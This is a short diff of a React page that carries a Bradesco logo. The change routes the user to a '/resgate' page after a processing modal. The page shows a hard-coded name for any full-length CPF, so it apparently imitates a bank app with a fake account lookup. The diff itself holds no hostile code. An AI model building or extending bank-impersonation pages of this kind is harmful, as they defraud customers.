@@ -1,4 +1,5 @@
 import { useState } from "react";
+import { useNavigate } from "react-router-dom";
 import { Menu, Bell } from "lucide-react";
 import AttentionModal from "@/components/AttentionModal";
 import ProcessingModal from "@/components/ProcessingModal";
@@ -6,6 +7,7 @@ import bradescoLogo from "@/assets/bradesco-logo.png";
 import BottomNav from "@/components/BottomNav";
 
 const Index = () => {
+  const navigate = useNavigate();
   const [modalOpen, setModalOpen] = useState(true);
   const [processingOpen, setProcessingOpen] = useState(false);
   const [toggleOn, setToggleOn] = useState(false);
@@ -102,7 +104,7 @@ const Index = () => {
       <ProcessingModal
         open={processingOpen}
         userName={cpf.length === 14 ? "Jair M Bolsonaro" : ""}
-        onComplete={() => setProcessingOpen(false)}
+        onComplete={() => { setProcessingOpen(false); navigate("/resgate"); }}
       />
     </div>
   );
